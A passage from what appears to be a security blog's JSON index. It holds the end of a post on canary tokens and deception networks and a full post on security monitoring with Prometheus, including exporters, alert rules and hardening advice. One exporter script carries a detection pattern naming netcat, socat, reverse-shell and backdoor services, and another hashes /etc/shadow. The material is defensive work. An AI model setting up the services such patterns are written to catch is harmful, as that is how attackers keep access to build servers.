aren\u0026rsquo;t magic. They just make the attacker spend time where you can see them.\nToken Chains (A Practical One) The idea is simple: one canary points at a second thing that is also instrumented.\nExample chain that works in real environments:\nYou plant a document canary called VPN_Credentials_2026.xlsx on a share. The document contains a link to an \u0026ldquo;internal runbook\u0026rdquo;. The link is a URL canary. The runbook contains a fake SSH config snippet pointing at a honeypot host. The honeypot host is OpenCanary (or any SSH honeypot). Any login attempt is a second alert, and it gives you richer telemetry. Why this is better than a single token:\nDocument open tells you \u0026ldquo;someone saw it\u0026rdquo; URL click tells you \u0026ldquo;someone followed instructions\u0026rdquo; SSH attempt tells you \u0026ldquo;someone tried to use the creds\u0026rdquo; (and often what they tried next) The key trick is the DNS: make the honeypot host look boring and internal.\nHost ops-backup-02.internal User backup Port 22 Point ops-backup-02.internal at your honeypot IP in internal DNS. Don\u0026rsquo;t point it at production. Ever.\nDeception Networks (Keep It Contained) If you go beyond single tokens, containment matters more than realism.\nMinimal architecture that doesn\u0026rsquo;t bite you later:\nSeparate subnet/VLAN/VPC for deception systems No routing into production networks Strict egress (only to your logging/alerting, and maybe patch repos) DNS that makes it look plausible (fileshare-01.internal, backup-nas-02.internal) Populate it with a few services attackers actually poke:\nSMB/HTTP file share decoy (read-only, fake docs) SSH honeypot (logs usernames, passwords, attempted commands) Fake \u0026ldquo;admin portal\u0026rdquo; over HTTP with a login page (just enough to keep them busy) If an attacker can pivot from your deception network into prod, you\u0026rsquo;ve built a nice training environment for them. Don\u0026rsquo;t.\nAdaptive Response (Not Adaptive Tokens) The token doesn\u0026rsquo;t need to change. Your response does.\nMost canary systems can call a webhook. If yours can, you can do basic escalation without buying another platform.\nHere\u0026rsquo;s a tiny webhook receiver that:\nLogs every event Escalates if the same token gets hit repeatedly Pages if multiple different tokens are hit from the same source #!/usr/bin/env python3 import json import sqlite3 import time from http.server import BaseHTTPRequestHandler, HTTPServer from urllib.request import Request, urlopen DB_PATH = \u0026#34;./canary-events.sqlite\u0026#34; SLACK_WEBHOOK_URL = \u0026#34;https://hooks.slack.com/services/REPLACE/ME\u0026#34; def init_db(): con = sqlite3.connect(DB_PATH) con.execute( \u0026#34;\u0026#34;\u0026#34; create table if not exists events ( ts integer not null, token text, source text, raw text not null ) \u0026#34;\u0026#34;\u0026#34; ) con.commit() con.close() def slack(msg: str): payload = json.dumps({\u0026#34;text\u0026#34;: msg}).encode(\u0026#34;utf-8\u0026#34;) req = Request(SLACK_WEBHOOK_URL, data=payload, headers={\u0026#34;Content-Type\u0026#34;: \u0026#34;application/json\u0026#34;}) urlopen(req, timeout=5).read() def norm_token(d: dict) -\u0026gt; str: return str(d.get(\u0026#34;token\u0026#34;) or d.get(\u0026#34;token_id\u0026#34;) or d.get(\u0026#34;canarytoken\u0026#34;) or \u0026#34;unknown\u0026#34;) def norm_source(d: dict) -\u0026gt; str: return str(d.get(\u0026#34;source_ip\u0026#34;) or d.get(\u0026#34;src_ip\u0026#34;) or d.get(\u0026#34;ip\u0026#34;) or \u0026#34;unknown\u0026#34;) def record_and_score(token: str, source: str, raw: str) -\u0026gt; dict: now = int(time.time()) con = sqlite3.connect(DB_PATH) con.execute(\u0026#34;insert into events(ts, token, source, raw) values(?, ?, ?, ?)\u0026#34;, (now, token, source, raw)) con.commit() window = now - 3600 token_hits = con.execute( \u0026#34;select count(*) from events where ts \u0026gt;= ? and token = ? and source = ?\u0026#34;, (window, token, source), ).fetchone()[0] distinct_tokens = con.execute( \u0026#34;select count(distinct token) from events where ts \u0026gt;= ? and source = ?\u0026#34;, (window, source), ).fetchone()[0] con.close() return {\u0026#34;token_hits\u0026#34;: token_hits, \u0026#34;distinct_tokens\u0026#34;: distinct_tokens} class Handler(BaseHTTPRequestHandler): def do_POST(self): length = int(self.headers.get(\u0026#34;Content-Length\u0026#34;, \u0026#34;0\u0026#34;)) raw = self.rfile.read(length).decode(\u0026#34;utf-8\u0026#34;, errors=\u0026#34;replace\u0026#34;) try: data = json.loads(raw) except Exception: data = {} token = norm_token(data) source = norm_source(data) score = record_and_score(token, source, raw) if score[\u0026#34;distinct_tokens\u0026#34;] \u0026gt;= 3: slack(f\u0026#34;CRITICAL: multiple canaries hit from {source} in 1h (distinct={score[\u0026#39;distinct_tokens\u0026#39;]})\u0026#34;) elif score[\u0026#34;token_hits\u0026#34;] \u0026gt;= 2: slack(f\u0026#34;WARN: repeated canary hit token={token} source={source} hits={score[\u0026#39;token_hits\u0026#39;]} (1h)\u0026#34;) self.send_response(204) self.end_headers() if __name__ == \u0026#34;__main__\u0026#34;: init_db() HTTPServer((\u0026#34;0.0.0.0\u0026#34;, 8080), Handler).serve_forever() You don\u0026rsquo;t need perfect enrichment. You need a sensible default: first hit = investigate, repeated hits = escalate.\nLegal and Ethical Considerations Legal concerns:\nInform employees about monitoring (in acceptable use policy) Comply with data protection regulations (GDPR, etc.) Don\u0026rsquo;t deploy canaries that affect external parties Consult legal before deployment Ethical concerns:\nTransparency: Employees should know monitoring exists (not specifics) Proportionality: Response should match threat Privacy: Only collect data needed for security Fairness: Same rules for everyone Documentation:\nAdd to acceptable use policy:\n7. Security Monitoring The company employs various security monitoring technologies, including but not limited to network monitoring, endpoint protection, and deception technologies. Access to systems and data may be monitored and logged for security purposes. Unauthorized access attempts will be detected and investigated. General enough to cover canaries without revealing specifics.\nSummary Canary tokens solve a fundamental problem: detecting breaches quickly.\nKey points:\nPrevention fails - You need detection Traditional detection is noisy - Canaries are signal Early detection matters - Time is critical Simple to deploy - Start with free options Nearly zero false positives - Every alert matters Strategic placement - Where attackers will look Integrate with existing security - Complement, not replace Getting started:\nIdentify high-value targets in your environment Create 3-5 canaries using canarytokens.org (free) Place them strategically Document where they are Test that alerts work Create response procedure Wait for alerts (hopefully never, but you\u0026rsquo;re ready) Don\u0026rsquo;t overthink it. Three well-placed canaries are better than zero perfectly-planned-but-not-deployed canaries.\nStart small. Learn. Expand.\nPrevention gets the budget. Detection saves the day.\nBased on deploying canary tokens at organizations ranging from startups to financial institutions. They work. They\u0026rsquo;re simple. They\u0026rsquo;re cheap. Use them.\n","date":"6 Nov 2024","permalink":"https://gazsecops.github.io/posts/canary-tokens-early-warning/","summary":"\u003cdiv class=\"dialogue\"\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-management\"\u003eManagement:\u003c/span\u003e How long did the attacker have access before you detected them?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e About six months.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-management\"\u003eManagement:\u003c/span\u003e What finally tipped you off?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e Customer complained their data showed up on a forum.\u003c/p\u003e\n\u003c/div\u003e\n\u003cp\u003eThis conversation happens more than you\u0026rsquo;d think. Not because organizations lack security tools. Because they lack detection that works when prevention fails.\u003c/p\u003e\n\u003caside class=\"pullquote\"\u003e\n\"Prevention gets all the budget. Detection gets what's left. Yet detection is what tells you when prevention failed - which it will.\"\n\u003c/aside\u003e\n\u003cp\u003eCanary tokens are silent tripwires. Fake data that looks valuable. When accessed, you get an alert. No false positives. No tuning. No complex rules. Just a clear signal: someone\u0026rsquo;s where they shouldn\u0026rsquo;t be.\u003c/p\u003e","tags":["security","detection","deception","operations"],"title":"Canary Tokens: Early Warning Systems That Actually Work"},{"content":" Management: We need better visibility into security events.\nSysadmin: What are you currently monitoring?\nManagement: Service uptime. CPU. Memory. The usual.\nSysadmin: What about failed logins? Unexpected services? File changes?\nManagement: That\u0026rsquo;s what the SIEM is for.\nSysadmin: When did you last look at the SIEM?\nManagement: \u0026hellip;\nThis is the problem with security monitoring. Teams spend thousands on SIEMs that nobody uses. Meanwhile, Prometheus sits there collecting metrics, and nobody thinks to point it at security problems.\n\"Security monitoring doesn't need a six-figure SIEM budget. It needs metrics that matter, alerts that fire when something's actually wrong, and people who respond when they do.\" Prometheus is already in your infrastructure. It\u0026rsquo;s collecting metrics. It\u0026rsquo;s generating alerts. You just need to point it at the right things.\nWhy Prometheus for Security Monitoring Most people use Prometheus for service health. Application performance. Infrastructure capacity. It\u0026rsquo;s time-series data. Simple metrics. Basic alerting.\nWhich is exactly what security monitoring needs.\nWhat security needs:\nReal-time visibility (Prometheus scrapes every 15-60 seconds) Lightweight collection (doesn\u0026rsquo;t hammer systems or network) Custom metrics (instrument whatever matters in your environment) Alerting that works (alert when thresholds breach, not on keyword matches) Linux-native (works everywhere, no agent hell) What security doesn\u0026rsquo;t need:\nComplex correlation engines Six-month queries Compliance reports Query languages that require training License costs per GB ingested Prometheus gives you fast feedback on specific security indicators. Not forensics. Not compliance. Just \u0026ldquo;is this thing happening right now that shouldn\u0026rsquo;t be?\u0026rdquo;\nThe Cases Where It Works SSH Brute Force Detection Public-facing SSH endpoints get hammered constantly. Some attacks are slow. Some are distributed. Traditional fail2ban works for obvious attacks but misses the subtle ones.\nMonitor failed SSH attempts as a metric. Alert on rate of change.\nCustom exporter (Python):\n#!/usr/bin/env python3 from prometheus_client import start_http_server, Counter import subprocess import time FAILED_SSH = Counter(\u0026#39;ssh_failed_attempts_total\u0026#39;, \u0026#39;Total failed SSH authentication attempts\u0026#39;, [\u0026#39;user\u0026#39;]) def get_failed_attempts(): \u0026#34;\u0026#34;\u0026#34;Parse auth.log for failed attempts by user\u0026#34;\u0026#34;\u0026#34; result = subprocess.run( [\u0026#34;grep\u0026#34;, \u0026#34;Failed password\u0026#34;, \u0026#34;/var/log/auth.log\u0026#34;], capture_output=True, text=True ) attempts = {} for line in result.stdout.split(\u0026#39;\\n\u0026#39;): if \u0026#39;for\u0026#39; in line and \u0026#39;from\u0026#39; in line: # Extract username user = line.split(\u0026#39;for \u0026#39;)[1].split(\u0026#39; from\u0026#39;)[0] attempts[user] = attempts.get(user, 0) + 1 return attempts LAST_COUNTS = {} def update_metrics(): attempts = get_failed_attempts() for user, count in attempts.items(): prev = LAST_COUNTS.get(user, 0) if count \u0026gt; prev: FAILED_SSH.labels(user=user).inc(count - prev) LAST_COUNTS[user] = count if __name__ == \u0026#34;__main__\u0026#34;: start_http_server(9101) while True: update_metrics() time.sleep(60) Prometheus scrape config:\nscrape_configs: - job_name: \u0026#39;ssh_security\u0026#39; static_configs: - targets: [\u0026#39;host1:9101\u0026#39;, \u0026#39;host2:9101\u0026#39;, \u0026#39;host3:9101\u0026#39;] Alert rule:\ngroups: - name: ssh_security rules: - alert: SSHBruteForce expr: increase(ssh_failed_attempts_total[10m]) \u0026gt; 10 for: 5m labels: severity: warning annotations: summary: \u0026#34;SSH brute force detected on {{ $labels.instance }}\u0026#34; description: \u0026#34;{{ $value }} failed attempts in 10 minutes for user {{ $labels.user }}\u0026#34; This catches slow attacks that fail2ban misses. Distributed attacks from multiple sources. Credential stuffing attempts.\nWhat you get:\nAlert when attack rate changes (not just absolute counts) Per-user visibility (see which accounts are targeted) Historical trends (identify attack campaigns) No log parsing overhead (metrics are aggregated) CI/CD Pipeline Security Build servers run with elevated permissions. Access to secrets. Ability to deploy to production. Perfect target.\nMost teams monitor pipeline success rates and build times. Nobody monitors the security posture of the runners themselves.\nWhat to monitor:\nUnexpected systemd services (persistence mechanisms) New user accounts (backdoor access) Unusual network connections (data exfiltration) File system changes in sensitive directories Resource spikes (cryptomining) Bash exporter for suspicious services:\n#!/bin/bash # /usr/local/bin/pipeline-security-exporter.sh cat \u0026lt;\u0026lt; \u0026#39;EOF\u0026#39; # HELP pipeline_suspicious_services Number of suspicious systemd services # TYPE pipeline_suspicious_services gauge EOF # List of service patterns that shouldn\u0026#39;t exist on build servers SUSPICIOUS_PATTERNS=\u0026#34;nc\\.service|ncat\\.service|socat\\.service|reverse.*\\.service|backdoor.*\\.service\u0026#34; COUNT=$(systemctl list-units --type=service --all | grep -E \u0026#34;$SUSPICIOUS_PATTERNS\u0026#34; | wc -l) echo \u0026#34;pipeline_suspicious_services $COUNT\u0026#34; # Check for new users created during pipeline runs cat \u0026lt;\u0026lt; \u0026#39;EOF\u0026#39; # HELP pipeline_unexpected_users Number of user accounts created today # TYPE pipeline_unexpected_users gauge EOF # Assuming clean runners start fresh, any new users are suspicious BASELINE_USERS=50 # Adjust for your environment CURRENT_USERS=$(cat /etc/passwd | wc -l) NEW_USERS=$((CURRENT_USERS - BASELINE_USERS)) if [ $NEW_USERS -lt 0 ]; then NEW_USERS=0 fi echo \u0026#34;pipeline_unexpected_users $NEW_USERS\u0026#34; Deploy as textfile collector:\n# Run script every minute via cron * * * * * /usr/local/bin/pipeline-security-exporter.sh \u0026gt; /var/lib/node_exporter/textfile_collector/pipeline_security.prom Alert on any non-zero values:\n- alert: PipelineSuspiciousServices expr: pipeline_suspicious_services \u0026gt; 0 for: 0m # Alert immediately labels: severity: critical annotations: summary: \u0026#34;Suspicious systemd services on {{ $labels.instance }}\u0026#34; description: \u0026#34;Found {{ $value }} suspicious services\u0026#34; - alert: PipelineUnexpectedUsers expr: pipeline_unexpected_users \u0026gt; 0 for: 0m # Alert immediately labels: severity: critical annotations: summary: \u0026#34;Unexpected user accounts on {{ $labels.instance }}\u0026#34; description: \u0026#34;Found {{ $value }} new user accounts (baseline mismatch)\u0026#34; Reality check:\nThis won\u0026rsquo;t catch sophisticated attackers who clean up after themselves. But it catches:\nScript kiddies who install netcat services Supply chain attacks that add persistence Compromised dependencies that create user accounts Cryptominers that install systemd services Most attacks aren\u0026rsquo;t sophisticated. Most are opportunistic. This catches the opportunistic ones.\nFile Integrity Monitoring Commercial FIM solutions cost money and add agent overhead. Prometheus can do basic FIM with a shell script.\nWhat to monitor:\n/etc/passwd and /etc/shadow (user accounts) /etc/sudoers (privilege escalation) SSH authorized_keys files Cron directories (/etc/cron.*) Systemd service files Application configuration files with secrets Exporter approach:\n#!/bin/bash # /usr/local/bin/fim-exporter.sh cat \u0026lt;\u0026lt; \u0026#39;EOF\u0026#39; # HELP fim_checksum_numeric Numeric representation of file checksum for change detection # TYPE fim_checksum_numeric gauge EOF # Files to monitor FILES=( \u0026#34;/etc/passwd\u0026#34; \u0026#34;/etc/shadow\u0026#34; \u0026#34;/etc/sudoers\u0026#34; \u0026#34;/etc/ssh/sshd_config\u0026#34; \u0026#34;/root/.ssh/authorized_keys\u0026#34; ) for file in \u0026#34;${FILES[@]}\u0026#34;; do if [ -f \u0026#34;$file\u0026#34; ]; then # Get SHA256 hash and convert to decimal for Prometheus # Take first 16 chars of hex (fits in 64-bit float) hash=$(sha256sum \u0026#34;$file\u0026#34; | cut -d\u0026#39; \u0026#39; -f1 | cut -c1-16) decimal=$(echo \u0026#34;ibase=16; $(echo $hash | tr a-f A-F)\u0026#34; | bc) # Sanitize filename for label label=$(echo \u0026#34;$file\u0026#34; | sed \u0026#39;s/\\//_/g\u0026#39; | sed \u0026#39;s/^_//\u0026#39;) echo \u0026#34;fim_checksum_numeric{file=\\\u0026#34;$file\\\u0026#34;} $decimal\u0026#34; fi done Alert on any change:\n- alert: CriticalFileModified expr: changes(fim_checksum_numeric[5m]) \u0026gt; 0 for: 0m labels: severity: critical annotations: summary: \u0026#34;Critical file modified on {{ $labels.instance }}\u0026#34; description: \u0026#34;File {{ $labels.file }} has been modified\u0026#34; Limitations:\nThis is simple change detection. It doesn\u0026rsquo;t tell you what changed or who changed it. It just tells you it changed.\nFor critical systems, that\u0026rsquo;s often enough. You shouldn\u0026rsquo;t be changing /etc/shadow on production systems. If it changes, investigate.\nFor systems with legitimate changes, this generates noise. Use it where files genuinely shouldn\u0026rsquo;t change.\nContainer Security Monitoring If you\u0026rsquo;re running Kubernetes, you\u0026rsquo;re probably already using Prometheus. You\u0026rsquo;re monitoring pods, deployments, resource usage.\nAre you monitoring security events?\nMetrics to collect:\nContainers running as root (most shouldn\u0026rsquo;t be) Containers with privileged mode (very few should be) Containers mounting sensitive host paths Image pull failures (supply chain visibility) Security context violations Most of this comes from kube-state-metrics. You just need to alert on it.\nAlert on privileged containers:\nkube-state-metrics exposes kube_pod_spec_containers_security_context_privileged (value 1 if privileged). Join it with running status:\n- alert: PrivilegedContainer expr: | kube_pod_container_status_running{container!=\u0026#34;\u0026#34;} == 1 and on(namespace, pod, container) kube_pod_spec_containers_security_context_privileged == 1 for: 5m labels: severity: warning annotations: summary: \u0026#34;Privileged container running in {{ $labels.namespace }}\u0026#34; description: \u0026#34;Container {{ $labels.container }} in pod {{ $labels.pod }} is running with privileged mode\u0026#34; Alert on containers running as root:\nkube-state-metrics exposes kube_pod_spec_containers_security_context_run_as_user. Alert when it\u0026rsquo;s 0 (root):\n- alert: ContainerRunningAsRoot expr: | kube_pod_container_status_running{container!=\u0026#34;\u0026#34;} == 1 and on(namespace, pod, container) kube_pod_spec_containers_security_context_run_as_user == 0 for: 5m labels: severity: info annotations: summary: \u0026#34;Container running as root in {{ $labels.namespace }}\u0026#34; description: \u0026#34;Container {{ $labels.container }} in pod {{ $labels.pod }} is running as UID 0\u0026#34; Note: not every pod sets runAsUser explicitly. If the field is absent, kube-state-metrics won\u0026rsquo;t emit the metric at all, so this alert only catches pods that explicitly set runAsUser: 0. For broader coverage, combine with an OPA/Kyverno admission policy that requires runAsNonRoot: true.\nThese aren\u0026rsquo;t always problems. Some workloads legitimately need privileges. But you should know which ones and alert when unexpected ones appear.\nDNS Exfiltration Detection DNS tunneling is common for data exfiltration and C2 communication. High volume of DNS queries to unusual domains is a strong indicator.\nIf you\u0026rsquo;re using CoreDNS in Kubernetes, it already exports Prometheus metrics.\nAlert on DNS query spikes:\n- alert: DNSQuerySpike expr: | rate(coredns_dns_requests_total[5m]) \u0026gt; avg_over_time(rate(coredns_dns_requests_total[5m])[1h:]) * 5 for: 10m labels: severity: warning annotations: summary: \u0026#34;DNS query spike detected on {{ $labels.instance }}\u0026#34; description: \u0026#34;DNS queries are 5x higher than normal average\u0026#34; Alert on NXDOMAIN spike (common exfiltration signal):\nCoreDNS exports response codes. A sudden spike in NXDOMAIN responses often indicates tunnelling (lots of unique subdomains) or a misconfigured service:\n- alert: DNSNXDomainSpike expr: | rate(coredns_dns_responses_total{rcode=\u0026#34;NXDOMAIN\u0026#34;}[5m]) / rate(coredns_dns_responses_total[5m]) \u0026gt; 0.15 for: 10m labels: severity: warning annotations: summary: \u0026#34;High NXDOMAIN rate on {{ $labels.instance }}\u0026#34; description: \u0026#34;NXDOMAIN responses are {{ $value | humanizePercentage }} of all DNS responses\u0026#34; Note: CoreDNS metrics track queries by zone and response code, not by queried domain name. If you need per-domain visibility (e.g. \u0026ldquo;which client queried which domain\u0026rdquo;), you need DNS query logging (CoreDNS log plugin) piped into a log aggregator, not Prometheus.\nThese alerts won\u0026rsquo;t catch sophisticated tunnelling. But they catch:\nObvious tunneling tools (dnscat2, iodine) Malware using DNS for C2 Data exfiltration via DNS queries What Prometheus Doesn\u0026rsquo;t Do Be realistic about limitations.\nPrometheus is not:\nA SIEM (no long-term log storage, no correlation engine) Forensics tool (metrics are aggregated, not raw events) Compliance solution (no audit trail of who accessed what) Threat intelligence platform (no IOC feeds, no reputation data) DLP solution (no content inspection) Prometheus is:\nReal-time monitoring of specific indicators Fast alerting when thresholds breach Trend analysis over hours/days Lightweight collection that doesn\u0026rsquo;t kill systems Use it for what it\u0026rsquo;s good at. Don\u0026rsquo;t try to make it do everything.\nMaking Alerts Useful Security alerts are worthless if nobody responds to them.\nAlert rules:\nCritical alerts go to pagers - File integrity changes, privileged containers, pipeline compromise Warning alerts go to Slack - SSH attacks, DNS spikes, unusual activity Info alerts go to dashboards - Trends, baselines, context Alert fatigue is real:\nStart with low-sensitivity rules Tune thresholds based on actual environment Disable alerts that fire constantly Don\u0026rsquo;t alert on things you can\u0026rsquo;t act on Engineer: We\u0026rsquo;re getting 50 SSH alerts per hour.\nSysadmin: Are you responding to them?\nEngineer: No, they\u0026rsquo;re all background noise from Chinese IPs.\nSysadmin: Then why are you alerting on them?\nEngineer: Security said we need visibility.\nSysadmin: Visibility means dashboards. Alerts mean \u0026ldquo;do something now.\u0026rdquo; If you\u0026rsquo;re not doing something, turn off the alert.\nDashboard the trends. Alert on deviations. Don\u0026rsquo;t alert on normal internet background radiation.\nSecuring Prometheus Itself Prometheus tells you what is running where. That\u0026rsquo;s why it\u0026rsquo;s useful.\nIt\u0026rsquo;s also why you should treat it like an internal admin interface.\nIf an attacker can query Prometheus, they can:\nMap your estate (hostnames, pods, namespaces, container names) Pull versions (kernel, runtimes, sometimes app versions) Find juicy targets (databases, CI runners, bastions) See what you\u0026rsquo;re already alerting on (and work around it) Keep It Private Prometheus and exporters should not be public. Not even \u0026ldquo;just for a bit\u0026rdquo;.\nOn a VM, bind Prometheus to localhost and only expose it through a private reverse proxy / VPN:\n# /etc/systemd/system/prometheus.service (snippet) [Service] ExecStart=/usr/local/bin/prometheus \\ --config.file=/etc/prometheus/prometheus.yml \\ --storage.tsdb.path=/var/lib/prometheus \\ --web.listen-address=127.0.0.1:9090 On Kubernetes, make it a ClusterIP service and put authentication on the Ingress. Add NetworkPolicies so only Grafana and other trusted things can talk to it.\nAdd Authentication (Prometheus Doesn\u0026rsquo;t Do This For You) Prometheus doesn\u0026rsquo;t have built-in auth. Put a reverse proxy in front of it.\nSimple option: Caddy with basic auth (fine for a small team behind a VPN):\nprom.example.internal { encode zstd gzip basicauth { gareth $2a$12$REPLACE_WITH_BCRYPT_HASH } reverse_proxy 127.0.0.1:9090 } Generate the bcrypt hash with:\ncaddy hash-password --plaintext \u0026#39;choose-a-real-password\u0026#39; If you\u0026rsquo;re already using SSO, put OIDC in front (oauth2-proxy, nginx auth_request, whatever you already run). The big win isn\u0026rsquo;t the tool - it\u0026rsquo;s having some identity boundary and logs.\nUse TLS For Scrapes (Or Keep Scrapes On A Trusted Network) If Prometheus scrapes over networks you don\u0026rsquo;t control, use TLS. Most exporters support this via --web.config.file.\nExample scrape config with TLS:\nscrape_configs: - job_name: node scheme: https static_configs: - targets: [\u0026#39;node1.internal:9100\u0026#39;, \u0026#39;node2.internal:9100\u0026#39;] tls_config: ca_file: /etc/prometheus/pki/ca.crt server_name: node-exporter.internal If you don\u0026rsquo;t want to deal with TLS on every exporter, keep scrapes on a private network segment and firewall it properly.\nTreat Exporters Like Attack Surface node_exporter is basically \u0026ldquo;tell me about this box\u0026rdquo; on port 9100. Keep it private too.\nIf you must expose an exporter, put it behind TLS/auth or a tunnel. Don\u0026rsquo;t leave it on the internet and hope nobody notices.\nDon\u0026rsquo;t Leak Secrets Into Labels Metric labels get stored in plaintext. Forever (or at least until retention expires).\nDon\u0026rsquo;t put:\nPasswords, tokens, API keys Session IDs Email addresses / customer IDs For custom exporters: treat label values as public. If you need detail, emit a count and send the raw event to logs.\nLock Down Grafana Too Grafana is where people actually browse this stuff.\nUse teams/folders and restrict access to security dashboards. Not because developers are malicious - because \u0026ldquo;everyone can see everything\u0026rdquo; turns into screenshots pasted into tickets, Slack, and vendor calls.\nCommon Mistakes Exposing node_exporter on the public internet. Running Prometheus with no auth. Turning on admin endpoints (--web.enable-admin-api, --web.enable-lifecycle) and forgetting they\u0026rsquo;re there. Putting secrets in metric labels. Giving everyone access to everything because it\u0026rsquo;s easier.\nWhen to Use Something Else Prometheus isn\u0026rsquo;t the answer to everything.\nUse a proper SIEM when:\nCompliance requires it (PCI-DSS, HIPAA, etc.) You need long-term retention (years, not weeks) You need complex correlation (multiple data sources) You need audit trails (who accessed what when) Use dedicated security tools when:\nYou need threat intelligence integration You need automated response (SOAR) You need deep packet inspection You need endpoint forensics Use Prometheus when:\nYou need fast feedback on specific indicators You have custom metrics that matter in your environment You want lightweight monitoring without agent hell You\u0026rsquo;re already using Prometheus for other things Don\u0026rsquo;t replace everything with Prometheus. Add security metrics to what you\u0026rsquo;re already collecting.\nGetting Started Start small. Add one security metric. See if it\u0026rsquo;s useful. Add another.\nWeek 1: Monitor SSH failed logins on public-facing systems. See what normal looks like. Set a threshold. Alert when exceeded.\nWeek 2: Add file integrity monitoring for critical files. See what changes and why. Reduce false positives.\nWeek 3: Add container security metrics. Find containers that shouldn\u0026rsquo;t be privileged. Fix them or whitelist them.\nWeek 4: Add custom metrics for your environment. What matters? What changes indicate problems?\nDon\u0026rsquo;t try to monitor everything. Monitor what matters. Alert on what\u0026rsquo;s actionable.\nReality Check This approach won\u0026rsquo;t catch advanced persistent threats. Won\u0026rsquo;t detect zero-days. Won\u0026rsquo;t stop nation-state actors.\nIt will catch:\nScript kiddies Opportunistic attacks Compromised credentials Insider mistakes Misconfigurations Supply chain compromises Most breaches aren\u0026rsquo;t sophisticated. Most are basic attacks that succeed because nobody was watching.\nPrometheus helps you watch.\nNot everything. Not perfectly. But the things that matter, in real time, with alerts that fire when they should.\nWhich is better than a SIEM nobody looks at.\n","date":"18 Oct 2024","permalink":"https://gazsecops.github.io/posts/prometheus-security-monitoring/","summary":"\u003cdiv class=\"dialogue\"\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-management\"\u003eManagement:\u003c/span\u003e We need better visibility into security events.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e What are you currently monitoring?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-management\"\u003eManagement:\u003c/span\u003e Service uptime. CPU. Memory. The usual.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e What about failed logins? Unexpected services? File changes?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-management\"\u003eManagement:\u003c/span\u003e That\u0026rsquo;s what the SIEM is for.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e When did you last look at the SIEM?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-management\"\u003eManagement:\u003c/span\u003e \u0026hellip;\u003c/p\u003e\n\u003c/div\u003e\n\u003cp\u003eThis is the problem with security monitoring. Teams spend thousands on SIEMs that nobody uses. Meanwhile, Prometheus sits there collecting metrics, and nobody thinks to point it at security problems.\u003c/p\u003e\n\u003caside class=\"pullquote\"\u003e\n\"Security monitoring doesn't need a six-figure SIEM budget. It needs metrics that matter, alerts that fire when something's actually wrong, and people who respond when they do.\"\n\u003c/aside\u003e\n\u003cp\u003ePrometheus is already in your infrastructure. It\u0026rsquo;s collecting metrics. It\u0026rsquo;s generating alerts. You just need to point it at the right things.\u003c/p\u003e","tags":["security","monitoring","prometheus","linux","operations"],"title":"Prometheus for Security: Monitoring What Actually Matters"}]